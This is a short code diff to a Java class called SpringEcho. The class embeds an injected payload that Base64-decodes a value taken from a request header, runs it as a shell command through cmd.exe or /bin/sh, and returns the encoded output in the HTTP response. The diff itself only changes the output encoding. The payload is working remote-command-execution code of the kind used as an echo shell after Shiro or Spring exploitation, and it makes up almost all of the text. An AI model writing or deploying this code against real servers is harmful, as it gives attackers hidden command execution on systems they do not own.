@@ -25,7 +25,7 @@ public class SpringEcho {
                 "                if (tc != null && !tc.isEmpty()) {\n" +
                 "                    String p = org.apache.shiro.codec.Base64.decodeToString(tc.replaceAll(\"Basic \", \"\"));\n" +
                 "                    String[] cmd = System.getProperty(\"os.name\").toLowerCase().contains(\"windows\") ? new String[]{\"cmd.exe\", \"/c\", p} : new String[]{\"/bin/sh\", \"-c\", p};\n" +
-                "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes();\n" +
+                "                    byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(\"\\\\A\").next().getBytes(\"UTF-8\");\n" +
                 "                    String base64Str = \"\";\n" +
                 "                    base64Str = org.apache.shiro.codec.Base64.encodeToString(result);\n" +
                 "                    httpresponse.getWriter().write(\"$$$\" + base64Str + \"$$$\");\n" +
